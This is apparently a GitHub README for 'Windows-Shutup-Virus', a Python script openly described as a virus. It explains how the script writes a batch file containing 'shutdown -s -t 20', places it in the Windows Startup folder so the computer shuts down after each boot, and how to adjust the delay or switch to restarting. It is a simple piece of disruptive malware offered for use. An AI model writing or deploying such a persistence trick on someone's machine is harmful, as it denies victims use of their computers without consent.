# Windows-Shutup-Virus
A simple Virus which will shutdown your computer when it boots to your desktop. It is made using python.

# Main Logic of the Script
- First will create a 'batch' script or .bat file named 'shutup.bat' in which the 'shutdown code' will be written. 
- After that it will move the 'shutup.bat' file in the STARTUP APPLICATIONS Folder.
- This will cause the system to automatically shutdown after boot as the script gets activated after boot.

# Shutdown Code
At line number 13, a Batch script is there `file.write("shutdown -s -t 20")`. <br>
You can edit that as per your needs. <br>
- You can put `-r` instead of `-s`. If you do so then the computer will just restart instead of shutting down.
- You can change the integer after `-t`. It will decide after how many seconds the computer will shutdown. <b>This Integer Value is always taken in SECONDS. Don't write 2 if you want to do that after 2 MINUTES. For 2 minutes, you have to write 120</b
